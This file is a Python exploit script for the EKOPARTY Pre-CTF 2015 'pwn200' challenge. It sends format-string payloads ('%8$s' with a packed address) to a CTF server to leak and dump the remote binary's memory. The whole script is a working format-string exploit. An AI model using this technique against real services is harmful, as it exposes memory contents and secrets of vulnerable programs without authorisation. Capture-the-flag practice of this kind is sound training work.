#!/usr/bin/python
#
# EKOPARTY PRE-CTF 2015
# pwn200
# @danigargu - w3b0n3s
#

import socket
import time
import sys
import re

from struct import pack

host = 'challs.ctf.site'
port =  20002

def get_connection(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip,port))
  return s

base = 0x13371000
image_size = 4096 + 1024

#base = 0x13372080 # data1 xored (64 bytes)
#base = 0x133720CC # data2 xored (32 bytes)

f = open('bin_dumped','wb')
i = 0

while i < image_size:
  s = get_connection(host, port)
  s.recv(0xFF)

  fmt = " " + pack("<L", base+i) + "%8$s"
  s.send(fmt + "\n")

  time.sleep(0.5)
  data = s.recv(4096)
  data = data[8:][:-19]

  if len(data) > 0:
    print "0x%08x (%2d) => %s => 0x%s" % (base+i, len(data), data, data.encode("hex"))
    f.write(data + "\x00")
    f.flush()
    i += len(data) + 1
  else:
    print "0x%08x => NULL" % (base+i)
    f.write("\x00")
    f.flush()
    i += 1
  s.close()

f.close()


